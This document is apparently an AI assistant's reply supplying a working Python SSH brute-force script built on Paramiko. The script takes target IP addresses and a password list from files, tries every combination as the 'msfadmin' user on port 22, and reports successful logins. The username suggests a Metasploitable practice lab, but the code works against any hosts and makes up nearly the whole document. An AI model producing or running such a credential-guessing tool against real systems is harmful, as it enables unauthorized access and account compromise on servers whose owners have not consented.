
# Here's the modified code to read IP addresses from `ip_addresses.txt` and attempt to SSH into each one using the `msfadmin` username and passwords from `passwords.txt`:

# SSH Brute-force Attack with Paramiko

import paramiko

def ssh_connect(hostname, port, username, password):
    # Create SSH client
    client = paramiko.SSHClient()

    # Automatically add host keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the SSH server
        client.connect(hostname, port=port, username=username, password=password)
        print(f"Login successful! Connected to {hostname} with username {username} and password {password}")

    except paramiko.AuthenticationException:
        print(f"Failed to login to {hostname} with username {username} and password {password}")
    except paramiko.SSHException as e:
        print(f"SSH connection failed: {e}")
    finally:
        # Close the SSH connection
        client.close()

def main():
    # SSH server port
    port = 22  # Default SSH port

    # SSH server username
    username = "msfadmin"

    # Read IP addresses from ip_addresses.txt
    try:
        with open("ip_addresses.txt", 'r') as ip_file:
            ip_addresses = ip_file.readlines()
    except FileNotFoundError:
        print("File 'ip_addresses.txt' not found.")
        return

    # Read passwords from passwords.txt
    try:
        with open("passwords.txt", 'r') as pass_file:
            passwords = pass_file.readlines()
    except FileNotFoundError:
        print("File 'passwords.txt' not found.")
        return

    # Strip newline characters from passwords
    passwords = [password.strip() for password in passwords]

    # Attempt SSH connection with each IP address and password combination
    for ip_address in ip_addresses:
        ip_address = ip_address.strip()  # Strip newline character
        for password in passwords:
            password = password.strip()  # Strip newline character
            print(f"Attempting SSH connection to {ip_address}...")
            ssh_connect(ip_address, port, username, password)

if __name__ == "__main__":
    main()

# We read IP addresses from `ip_addresses.txt` and passwords from `passwords.txt`.
# We attempt to SSH into each IP address using the `msfadmin` username and passwords from the `passwords.txt` file.
# If the connection is successful, we print a message indicating the successful login. If authentication fails, we print an appropriate error message.
